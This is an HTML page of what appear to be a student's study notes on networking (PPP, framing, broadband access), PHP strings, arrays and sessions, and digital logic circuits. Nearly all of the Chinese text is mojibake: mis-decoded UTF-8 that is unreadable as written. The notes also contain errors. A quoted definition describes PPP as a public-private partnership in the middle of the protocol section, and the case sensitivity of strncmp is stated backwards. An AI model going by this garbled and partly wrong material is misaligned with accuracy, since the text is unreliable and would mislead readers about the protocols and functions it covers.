<li>ç åˆ†å¤ç”¨ï¼šæ¯ä¸€ä¸ªç”¨æˆ·åœ¨åŒæ ·æ—¶é—´ã€åŒæ ·é¢‘å¸¦é€šä¿¡ï¼Œä½†ä½¿ç”¨ä¸åŒç å‹ã€‚ã€æŠ—å¹²æ‰°èƒ½åŠ›å¼ºï¼Œé¢‘è°±ç±»ä¼¼äºç™½å™ªéŸ³ã€‘P57-58ï¼šå…·ä½“è¿‡ç¨‹åŠè®¡ç®—åŸç†</li>
</ol>
<h4 id="å®½å¸¦æ¥å…¥æŠ€æœ¯"><a href="#å®½å¸¦æ¥å…¥æŠ€æœ¯" class="headerlink" title="å®½å¸¦æ¥å…¥æŠ€æœ¯"></a>å®½å¸¦æ¥å…¥æŠ€æœ¯</h4><ol>
<li>ADSLï¼ˆAsymmetric Digital Subscriber Lineï¼‰éå¯¹ç§°æ•°å­—ç”¨æˆ·çº¿ï¼šå°†ç”µè¯çº¿ä½é¢‘æ®µç•™ç»™ç”µè¯ï¼Œé«˜é¢‘æ®µç”¨ä½œä¸Šç½‘</li>
<li>HFCï¼ˆHybird Fibre Coaxï¼‰å…‰çº¤åŒè½´æ··åˆç½‘ï¼šæœ‰çº¿ç”µè§†ç½‘åŸºç¡€ä¸Šå¼€å‘çš„</li>
<li>FTTxï¼ˆFiber To The Homeï¼‰ï¼šå…‰çº¤åˆ°æˆ·</li>
</ol>
<h3 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h3><h4 id="é€šä¿¡æ­¥éª¤"><a href="#é€šä¿¡æ­¥éª¤" class="headerlink" title="é€šä¿¡æ­¥éª¤"></a>é€šä¿¡æ­¥éª¤</h4><p>è®¾Aï¼šå‘é€æ–¹ï¼›Bï¼šæ¥æ”¶æ–¹</p>
<ol>
<li>Açš„æ•°æ®é“¾è·¯å±‚æŠŠ<strong>ç½‘ç»œå±‚</strong>ä¼ ä¸‹æ¥çš„æ•°æ®æ·»åŠ é¦–éƒ¨å’Œå°¾éƒ¨<strong>å°è£…æˆå¸§</strong>ã€‚</li>
<li>AæŠŠå°è£…å¥½çš„å¸§å‘é€ç»™Bçš„<strong>æ•°æ®é“¾è·¯å±‚</strong>ã€‚</li>
<li>è‹¥Bçš„<strong>æ•°æ®é“¾è·¯å±‚</strong>æ¥æ”¶åˆ°çš„å¸§æ— å·®é”™ï¼Œåˆ™åœ¨æ”¶åˆ°çš„å¸§ä¸­æå–<strong>IPæ•°æ®æŠ¥</strong>å‘ç»™<strong>ç½‘ç»œå±‚</strong>ï¼›å¦åˆ™ä¸¢å¼ƒã€‚</li>
</ol>
<h4 id="ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤"><a href="#ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤" class="headerlink" title="ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤"></a>ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤</h4><p><strong>å°è£…æˆå¸§ï¼š</strong>äº’è”ç½‘ä¸Š<strong>IPæ•°æ®æŠ¥</strong>ã€ç½‘ç»œå±‚ã€‘æ˜¯ä»¥åˆ†ç»„ä¸ºå•ä½ä¼ æ’­ï¼Œè€Œåˆ°äº†æ•°æ®é“¾è·¯å±‚å°±åŠ ä¸Šé¦–éƒ¨å’Œå°¾éƒ¨å°è£…æˆäº†å¸§ã€‚ä¸ºäº†åŒºåˆ†å¸§é¦–éƒ¨ã€å¸§å°¾éƒ¨å’Œä¸­é—´çš„IPæ•°æ®æŠ¥ï¼Œè®¾å®šäº†<strong>å¸§å¼€å§‹ç¬¦SOH</strong>å’Œ<strong>å¸§ç»“æŸç¬¦EOT</strong>ã€‚è¿˜æœ‰æ•°æ®éƒ¨åˆ†çš„é•¿åº¦ä¸Šé™MTUã€æœ€å¤§ä¼ é€å•å…ƒã€‘ã€‚</p>
<p><strong>é€æ˜ä¼ è¾“ï¼š</strong>æ ¹æ®å°è£…æˆå¸§çš„<strong>å¸§ç•Œå®šç¬¦</strong>ï¼Œæˆ‘ä»¬æ€è€ƒï¼Œå¦‚æœIPæ•°æ®æŠ¥é‡Œï¼Œå³<strong>å¸§çš„æ•°æ®éƒ¨åˆ†</strong>å‡ºç°äº†SOHæˆ–è€…EOTæ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬åœ¨å®ƒä»¬å‰é¢åŠ ä¸Šè½¬ä¹‰å­—ç¬¦â€œESCâ€ã€å­—ç¬¦å¡«å……ã€‘ï¼Œæ¥æ”¶ç«¯æ”¶åˆ°æ•°æ®å¸§<strong>ä¸Šä¼ ç»™ç½‘ç»œå±‚ä¹‹å‰</strong>ï¼Œå…ˆå»æ‰è¿™äº›è½¬ä¹‰å­—ç¬¦ã€‚</p>
<p><strong>å·®é”™æ£€æµ‹ï¼š</strong></p>
<blockquote>
<p>å¾ªç¯å†—ä½™æ£€æµ‹CRC</p>
</blockquote>
<h4 id="PPPåè®®ã€ç‚¹å¯¹ç‚¹ã€‘"><a href="#PPPåè®®ã€ç‚¹å¯¹ç‚¹ã€‘" class="headerlink" title="PPPåè®®ã€ç‚¹å¯¹ç‚¹ã€‘"></a>PPPåè®®ã€ç‚¹å¯¹ç‚¹ã€‘</h4><h5 id="pppåè®®çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š"><a href="#pppåè®®çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š" class="headerlink" title="pppåè®®çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š"></a>pppåè®®çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ï¼š</h5><ol>
<li>ä¸€ä¸ªå°†IPæ•°æ®æŠ¥å°è£…åˆ°ä¸²è¡Œé“¾è·¯çš„æ–¹æ³•ã€‚ã€HDLCï¼šHigh-Level Data Link Controlï¼Œé«˜çº§æ•°æ®é“¾è·¯æ§åˆ¶ã€‘</li>
<li>ä¸€ä¸ªç”¨æ¥å»ºç«‹ã€é…ç½®å’Œæµ‹è¯•æ•°æ®é“¾è·¯è¿æ¥çš„<strong>é“¾è·¯æ§åˆ¶åè®®</strong>ã€LCPï¼šLink Control Protocolã€‘</li>
<li>ä¸€å¥—<strong>ç½‘ç»œæ§åˆ¶åè®®</strong>ã€NCPï¼šNetwork Control Protocolã€‘</li>
</ol>
<h5 id="pppåè®®æ ¼å¼ï¼š"><a href="#pppåè®®æ ¼å¼ï¼š" class="headerlink" title="pppåè®®æ ¼å¼ï¼š"></a>pppåè®®æ ¼å¼ï¼š</h5><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/1jpg.jpg" alt="1jpg"></p>
<p>Få¤„çš„7Eä»£è¡¨<strong>å¸§å¼€å§‹å’Œç»“æŸ</strong>ã€‚<br>åè®®å¤„å­—æ®µä»£è¡¨<strong>åè®®çš„ç§ç±»</strong>ã€0xC021ï¼šLCPï¼›0x0021ï¼šIPæ•°æ®æŠ¥ï¼›0x8021ï¼šNCPã€‘<br>FCSï¼š<strong>CRCå¸§æ£€éªŒ</strong></p>
<p><strong>å­—èŠ‚å¡«å……</strong>ï¼šé‡åˆ°0x7Eæ—¶ï¼Œå˜ä¸º0x7Dã€0x5Eã€‚<br><strong>é›¶æ¯”ç‰¹å¡«å……ï¼š</strong>é‡åˆ°è¿ç»­5ä¸ª1ï¼Œå°±åœ¨å‘é€æ—¶å¡«å……ä¸€ä¸ª0ï¼›ç„¶åæ¥å—æ—¶å»æ‰è¿™ä¸ª0ã€‚</p>
<h5 id="pppåè®®å·¥ä½œçŠ¶æ€ï¼š"><a href="#pppåè®®å·¥ä½œçŠ¶æ€ï¼š" class="headerlink" title="pppåè®®å·¥ä½œçŠ¶æ€ï¼š"></a>pppåè®®å·¥ä½œçŠ¶æ€ï¼š</h5><ol>
<li>LCPåè®®â€“&gt;é‰´åˆ«çŠ¶æ€</li>
<li>PAPå£ä»¤é‰´åˆ«åè®®/CHAPå£ä»¤æ¡æ‰‹é‰´åˆ«åè®®â€“&gt;ç½‘ç»œå±‚åè®®çŠ¶æ€</li>
<li>NCPåè®®â€“&gt;é“¾è·¯æ‰“å¼€</li>
</ol>
<blockquote>
<p>pppåè®®å’Œpppoeåè®®</p>
<p>pppçš„æ¦‚è¿°ï¼šPPPæ¨¡å¼æ˜¯æŒ‡æ”¿åºœä¸ç§äººç»„ç»‡ä¹‹é—´ï¼Œä¸ºäº†æä¾›æŸç§å…¬å…±ç‰©å“å’ŒæœåŠ¡ï¼Œä»¥ç‰¹è®¸æƒåè®®ä¸ºåŸºç¡€ï¼Œå½¼æ­¤ä¹‹é—´å½¢æˆä¸€ç§ä¼™ä¼´å¼çš„åˆä½œå…³ç³»ã€‚</p>
<p>PPPOEçš„æ¦‚è¿°ï¼šPPPoEï¼ˆè‹±è¯­ï¼šPoint-to-Point Protocol Over Ethernetï¼‰ï¼Œä»¥å¤ªç½‘ä¸Šçš„ç‚¹å¯¹ç‚¹åè®®ï¼Œæ˜¯å°†ç‚¹å¯¹ç‚¹åè®®ï¼ˆPPPï¼‰å°è£…åœ¨<strong>ä»¥å¤ªç½‘ï¼ˆEthernetï¼‰æ¡†æ¶ä¸­</strong>çš„ä¸€ç§ç½‘ç»œéš§é“åè®®ã€‚</p>
</blockquote>
<h2 id="å­˜ç–‘çŸ¥è¯†ç‚¹"><a href="#å­˜ç–‘çŸ¥è¯†ç‚¹" class="headerlink" title="å­˜ç–‘çŸ¥è¯†ç‚¹"></a>å­˜ç–‘çŸ¥è¯†ç‚¹</h2><ol>
<li>ç åˆ†å¤ç”¨</li>
<li>CRCå¾ªç¯å†—ä½™æ£€æµ‹</li>
</ol>
<h1 id="è®¡ç®—æœºç»„æˆåŸç†"><a href="#è®¡ç®—æœºç»„æˆåŸç†" class="headerlink" title="è®¡ç®—æœºç»„æˆåŸç†"></a>è®¡ç®—æœºç»„æˆåŸç†</h1><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="PHPå˜é‡"><a href="#PHPå˜é‡" class="headerlink" title="PHPå˜é‡"></a>PHPå˜é‡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$m&#x3D;&quot;3.12r*r&quot;;</span><br><span class="line">$n&#x3D;1;</span><br><span class="line">$mn &#x3D; $m + $n;</span><br><span class="line">echo $mn;			&#x2F;&#x2F;4.12</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$m&#x3D;8;</span><br><span class="line">echo $m&gt;&gt;1;			&#x2F;&#x2F;4</span><br><span class="line">echo $m&lt;&lt;1;			&#x2F;&#x2F;16</span><br></pre></td></tr></table></figure>

<h3 id="æ•°æ®ä¼˜å…ˆçº§"><a href="#æ•°æ®ä¼˜å…ˆçº§" class="headerlink" title="æ•°æ®ä¼˜å…ˆçº§"></a>æ•°æ®ä¼˜å…ˆçº§</h3><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/2.jpg" alt="2"></p>
<h2 id="PHPå­—ç¬¦ä¸²"><a href="#PHPå­—ç¬¦ä¸²" class="headerlink" title="PHPå­—ç¬¦ä¸²"></a>PHPå­—ç¬¦ä¸²</h2><h3 id="å®šç•Œç¬¦"><a href="#å®šç•Œç¬¦" class="headerlink" title="å®šç•Œç¬¦"></a>å®šç•Œç¬¦</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$website = <span class="string">'Cè¯­è¨€ä¸­æ–‡ç½‘'</span>;</span><br><span class="line">$url = <span class="string">'http://c.biancheng.net/php/'</span>;</span><br><span class="line">$title = <span class="string">'PHP æ•™ç¨‹'</span>;</span><br><span class="line">$strmark = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt; <span class="subst">$title</span> &lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            æ‚¨æ­£åœ¨è®¿é—®çš„æ˜¯ï¼š&lt;strong style="color:#ff0000"&gt;<span class="subst">$website</span>&lt;/strong&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            ç½‘å€ï¼š&lt;a href="<span class="subst">$url</span>" target="_blank"&gt;<span class="subst">$url</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $strmark;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="å­—ç¬¦ä¸²æœ‰å…³å‡½æ•°"><a href="#å­—ç¬¦ä¸²æœ‰å…³å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²æœ‰å…³å‡½æ•°"></a>å­—ç¬¦ä¸²æœ‰å…³å‡½æ•°</h3><ol>
<li>å»é™¤é¦–å°¾ç©ºæ ¼ã€è¿”å›stringã€‘ï¼š<strong>trim</strong>(String [,string charlist])ã€<strong>ltrim</strong>(String [,string charlist])ã€<strong>rtrim</strong>(String [,string charlist])</li>
<li>è½¬ä¹‰ã€è¿˜åŸå­—ç¬¦ä¸²ã€è¿”å›stringã€‘ï¼š<strong>addslashes</strong>(String)ã€<strong>stripslashes</strong>(String)ã€<strong>addcslashes</strong>(String, string charlist)</li>
<li>è·å–å­—ç¬¦ä¸²é•¿åº¦ã€è¿”å›intã€‘ï¼š<strong>strlen</strong>(string)</li>
<li>æˆªå–å­—ç¬¦ä¸²ã€è¿”å›stringã€‘ï¼š<strong>substr</strong>(str,start[0å¼€å§‹],length)</li>
<li>æ¯”è¾ƒå­—ç¬¦ä¸²ã€è¿”å›intã€‘ï¼š<ol>
<li>æŒ‰å­—èŠ‚è¿›è¡Œæ¯”è¾ƒï¼š<strong>strcmp</strong>(str1,str2)ã€åŒºåˆ†å¤§å°å†™ã€‘ã€<strong>strcasecmp</strong>(str1,str2)ã€ä¸åŒºåˆ†å¤§å°å†™ã€‘</li>
<li>æŒ‰è‡ªç„¶æ’åºæ³•è¿›è¡Œæ¯”è¾ƒã€2&lt;10ã€å­—æ¯å¤§å°å†™æŒ‰ASCIIæ’åºï¼šå¤§å†™&lt;å°å†™ã€‘ï¼š<strong>strnatcmp</strong>(str1,str2)</li>
<li>æ¯”è¾ƒå­—ç¬¦ä¸²å‰nä¸ªå­—ç¬¦ï¼š<strong>strncmp</strong>(str1,str2,len)ã€ä¸åŒºåˆ†å¤§å°å†™ã€‘ã€<strong>Strncmp</strong>(str1,str2,len)ã€åŒºåˆ†å¤§å°å†™ã€‘</li>
</ol>
</li>
<li>æ£€ç´¢å­—ç¬¦ä¸²ã€needleä¸ºè¦æ£€ç´¢çš„å­—ç¬¦ã€‘ï¼šstring <strong>strstr</strong>(string, needle)ã€int <strong>substr_count</strong>(string,needle)</li>
<li>æ›¿æ¢å­—ç¬¦ä¸²ï¼š<ol>
<li>ã€å·²çŸ¥éœ€è¦è¢«æ›¿æ¢çš„å€¼ã€‘mixed <strong>str_ireplace</strong>(mixed searchã€æœç´¢çš„å€¼ã€‘, mixed replaceã€æ›¿æ¢æˆçš„å€¼ã€‘, mixed subjectã€éœ€è¦è¢«æ›¿æ¢çš„å€¼ã€‘ [, int &amp;countã€æ‰§è¡Œæ›¿æ¢çš„æ•°é‡ã€‘])</li>
<li>ã€å·²çŸ¥éœ€è¦è¢«æ›¿æ¢çš„ä½ç½®ã€‘mixed <strong>substr_replace</strong>(mixed string, mixed repl, mixed start, [mixed length])</li>
</ol>
</li>
<li>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼šstring <strong>number_format</strong>(float number, int decimals,ã€ä¿ç•™çš„å°æ•°ä½æ•°ã€‘ string dec_pointã€å°æ•°ç‚¹æ˜¾ç¤ºå­—ç¬¦ã€‘, string thousands_sepã€åƒä½åˆ†éš”ç¬¦æ˜¾ç¤ºå­—ç¬¦ã€‘)</li>
<li>åˆ†å‰²ã€åˆæˆå­—ç¬¦ä¸²ï¼š<ol>
<li>åˆ†å‰²å­—ç¬¦ä¸²ï¼šarray <strong>explode</strong>(string delimiterã€åˆ†éš”ç¬¦ã€‘, String [, int limit])</li>
<li>åˆæˆå­—ç¬¦ä¸²ï¼šstring <strong>implode</strong>(string glueã€åˆæˆå­—ç¬¦ä¸²çš„åˆ†éš”ç¬¦ã€‘, array pieces)</li>
</ol>
</li>
</ol>
<h2 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h2><ol>
<li>preg_grep</li>
<li>preg_matchã€preg_match_all</li>
<li>preg_quote</li>
<li>preg_replace</li>
<li>preg_replace_callback</li>
</ol>
<h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url&#x3D;array(&#39;ç™¾åº¦&#39;&#x3D;&gt;&#39;www.baidu.com&#39;,</span><br><span class="line">         &#39;æ–°æµªç½‘&#39;&#x3D;&gt;&#39;www.sina.com&#39;,</span><br><span class="line">         &#39;æœç‹&#39;&#x3D;&gt;&#39;www.sohu.com&#39;</span><br><span class="line">);</span><br><span class="line">foreach ($url as $chi &#x3D;&gt; $ind)&#123;</span><br><span class="line">    echo $chi.&#39; url is &#39;.$ind;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>â€‹    </p>
<h3 id="æ•°ç»„æœ‰å…³å‡½æ•°"><a href="#æ•°ç»„æœ‰å…³å‡½æ•°" class="headerlink" title="æ•°ç»„æœ‰å…³å‡½æ•°"></a>æ•°ç»„æœ‰å…³å‡½æ•°</h3><ol>
<li>count(Array, [COUNT_RECURSIVE])ï¼šç»Ÿè®¡æ•°ç»„å…ƒç´ </li>
<li>æŸ¥è¯¢æ•°ç»„ä¸­æŒ‡å®šå…ƒç´ ï¼šarray_search()</li>
<li>è·å–æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ï¼šmixed <strong>array_pop()</strong></li>
<li>å‘æ•°ç»„æ·»åŠ å…ƒç´ ï¼šint <strong>array_push()</strong></li>
<li>åˆ é™¤æ•°ç»„ä¸­é‡å¤å…ƒç´ ï¼šarray <strong>array_unique()</strong></li>
<li></li>
</ol>
<h2 id="ä¸€äº›æ³¨æ„ç‚¹"><a href="#ä¸€äº›æ³¨æ„ç‚¹" class="headerlink" title="ä¸€äº›æ³¨æ„ç‚¹"></a>ä¸€äº›æ³¨æ„ç‚¹</h2><h3 id="æ³¨é‡Šé‡Œä¸èƒ½æœ‰-gt"><a href="#æ³¨é‡Šé‡Œä¸èƒ½æœ‰-gt" class="headerlink" title="æ³¨é‡Šé‡Œä¸èƒ½æœ‰?&gt;"></a>æ³¨é‡Šé‡Œä¸èƒ½æœ‰?&gt;</h3><p>phpæ³¨é‡Šé‡Œä¸è¦å‡ºç°?&gt;æ ‡è®°ç‚¹ï¼Œç±»ä¼¼äº</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo &#39;123&#39;;   &#x2F;&#x2F;hhh?&gt;abcd</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å½“phpè§£é‡Šå™¨æ‰§è¡Œåˆ°æ³¨é‡Šé‡Œçš„?&gt;æ—¶ï¼Œä¼šè®¤ä¸ºPHPè„šæœ¬ç»“æŸï¼Œæ‰€ä»¥è¿™æ®µä¼šè¾“å‡º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123abcd?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="mysqlè¿æ¥"><a href="#mysqlè¿æ¥" class="headerlink" title="mysqlè¿æ¥"></a>mysqlè¿æ¥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;åˆ›å»ºè¡¨</span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;AG_users&#96;(</span><br><span class="line">   &#96;uid&#96; INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   &#96;username&#96; VARCHAR(100) NOT NULL,</span><br><span class="line">   &#96;password&#96; VARCHAR(100) NOT NULL,</span><br><span class="line">   &#96;email&#96; VARCHAR(30),</span><br><span class="line">   &#96;phone&#96; VARCHAR(20),</span><br><span class="line">   &#96;QQ&#96; VARCHAR(20),</span><br><span class="line">   PRIMARY KEY ( &#96;uid&#96; )</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure>





<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>æœ‰å…³sessionå­˜æ´»æ—¶é—´è¦ä¿®æ”¹php.iniï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;å•ä½æ˜¯ç§’</span><br><span class="line">session.cookie_lifetime&#x3D;600			&#x2F;&#x2F;è¯¥å€¼é»˜è®¤æ˜¯0ï¼Œå³å…³é—­æµè§ˆå™¨sessionæ¶ˆå¤±</span><br><span class="line">session.gc_maxlifetime&#x3D;600</span><br></pre></td></tr></table></figure>



<p>ã€ä»¥ä¸‹ç”±è¢å¤§ç¥æŒ‡å¯¼ã€‘</p>
<p>æ¯æ‰“å¼€ä¸€ä¸ªæ–°çš„é¡µé¢ã€åŒä¸€ä¸ªæµè§ˆå™¨ã€‘éƒ½éœ€è¦é‡æ–°session_start()ï¼Œä¸ç„¶å°±æ²¡æœ‰$_SESSIONå˜é‡ï¼Œæ¯æ¬¡é‡æ–°session_start()éƒ½æ˜¯å»æœåŠ¡å™¨å»è¿™ä¸ªsessionå˜é‡å€¼ã€‚</p>
<p>session_destoryä¼šå»é™¤æœåŠ¡å™¨ä¸Šçš„sessionæ•°æ®</p>
<p>session_unsetåªæ˜¯å»é™¤$SESSIONçš„å€¼ï¼Œå¹¶ä¸åˆ é™¤æœåŠ¡å™¨é‡Œçš„sessionæ•°æ®</p>
<h2 id="æ•°æ®ç±»å‹è½¬æ¢"><a href="#æ•°æ®ç±»å‹è½¬æ¢" class="headerlink" title="æ•°æ®ç±»å‹è½¬æ¢"></a>æ•°æ®ç±»å‹è½¬æ¢</h2><p>è½¬æ¢æˆBooleanå‹æ—¶ï¼Œ<strong>nullã€0ã€æœªèµ‹å€¼å˜é‡ã€æ•°ç»„</strong>éƒ½ä¼šè¢«è½¬æ¢ä¸ºfalseã€‚</p>
<h3 id="andå’Œ-amp-amp-ä¼˜å…ˆçº§ä¸ä¸€æ ·ï¼Œorå’Œ-ä¼˜å…ˆçº§ä¸ä¸€æ ·"><a href="#andå’Œ-amp-amp-ä¼˜å…ˆçº§ä¸ä¸€æ ·ï¼Œorå’Œ-ä¼˜å…ˆçº§ä¸ä¸€æ ·" class="headerlink" title="andå’Œ&amp;&amp;ä¼˜å…ˆçº§ä¸ä¸€æ ·ï¼Œorå’Œ||ä¼˜å…ˆçº§ä¸ä¸€æ ·"></a>andå’Œ&amp;&amp;ä¼˜å…ˆçº§ä¸ä¸€æ ·ï¼Œorå’Œ||ä¼˜å…ˆçº§ä¸ä¸€æ ·</h3><h1 id="æ•°ç”µ"><a href="#æ•°ç”µ" class="headerlink" title="æ•°ç”µ"></a>æ•°ç”µ</h1><h2 id="ç¬¬äº”ç« ï¼šç»„åˆé€»è¾‘ç”µè·¯"><a href="#ç¬¬äº”ç« ï¼šç»„åˆé€»è¾‘ç”µè·¯" class="headerlink" title="ç¬¬äº”ç« ï¼šç»„åˆé€»è¾‘ç”µè·¯"></a>ç¬¬äº”ç« ï¼šç»„åˆé€»è¾‘ç”µè·¯</h2><h3 id="5-1ï¼šæ¦‚è¿°"><a href="#5-1ï¼šæ¦‚è¿°" class="headerlink" title="5-1ï¼šæ¦‚è¿°"></a>5-1ï¼šæ¦‚è¿°</h3><p>åˆ†æå’Œè®¾è®¡çš„å¤§çº²ï¼š</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-1-2.png" alt="sd5-1-2"></p>
<p>è®¾è®¡çš„éš¾ç‚¹åœ¨æœ€åä¸€æ­¥ï¼š</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-1-1.png" alt></p>
<h3 id="5-2ï¼šç¼–ç å™¨"><a href="#5-2ï¼šç¼–ç å™¨" class="headerlink" title="5-2ï¼šç¼–ç å™¨"></a>5-2ï¼šç¼–ç å™¨</h3><h4 id="äºŒè¿›åˆ¶ç¼–ç å™¨"><a href="#äºŒè¿›åˆ¶ç¼–ç å™¨" class="headerlink" title="äºŒè¿›åˆ¶ç¼–ç å™¨"></a>äºŒè¿›åˆ¶ç¼–ç å™¨</h4><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-2-1.png" alt="sd5-2-1"></p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-2-2.png" alt="sd5-2-2"></p>
<h4 id="äºŒ-åè¿›åˆ¶ç¼–ç å™¨"><a href="#äºŒ-åè¿›åˆ¶ç¼–ç å™¨" class="headerlink" title="äºŒ-åè¿›åˆ¶ç¼–ç å™¨"></a>äºŒ-åè¿›åˆ¶ç¼–ç å™¨</h4><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-2-3.png" alt="sd5-2-3"></p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-2-4.png" alt="sd5-2-4"></p>
<p>â€‹    </p>
<h4 id="ä¼˜å…ˆæƒç¼–ç å™¨"><a href="#ä¼˜å…ˆæƒç¼–ç å™¨" class="headerlink" title="ä¼˜å…ˆæƒç¼–ç å™¨"></a>ä¼˜å…ˆæƒç¼–ç å™¨</h4><h3 id="5-3ï¼šè¯‘ç å™¨"><a href="#5-3ï¼šè¯‘ç å™¨" class="headerlink" title="5-3ï¼šè¯‘ç å™¨"></a>5-3ï¼šè¯‘ç å™¨</h3><p>2-4è¯‘ç å™¨</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-3-1.png" alt="sd5-3-1"></p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-3-2.png" alt="sd5-3-2"></p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-3-3.png" alt="sd5-3-3"></p>
<p>3-8è¯‘ç å™¨</p>
<p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd5-3-4.png" alt="sd5-3-4"></p>
<h2 id="ç¬¬å…­ç« ï¼šè§¦å‘å™¨"><a href="#ç¬¬å…­ç« ï¼šè§¦å‘å™¨" class="headerlink" title="ç¬¬å…­ç« ï¼šè§¦å‘å™¨"></a>ç¬¬å…­ç« ï¼šè§¦å‘å™¨</h2><h3 id="6-2ï¼šåŸºæœ¬RSè§¦å‘å™¨"><a href="#6-2ï¼šåŸºæœ¬RSè§¦å‘å™¨" class="headerlink" title="6-2ï¼šåŸºæœ¬RSè§¦å‘å™¨"></a>6-2ï¼šåŸºæœ¬RSè§¦å‘å™¨</h3><p><img src="/2021/03/02/%E5%A4%A7%E4%BA%8C%E4%B8%8B/sd6-2-1.png" alt="sd6-2-1"></p>
<p>Rä»£è¡¨æ¸…é›¶ï¼ˆResetï¼‰ï¼ŒSä»£è¡¨ç½®ä¸€ï¼ˆSetï¼‰ï¼Œä¸‹æ ‡Dä»£è¡¨æ— æ•ˆã€‚</p>
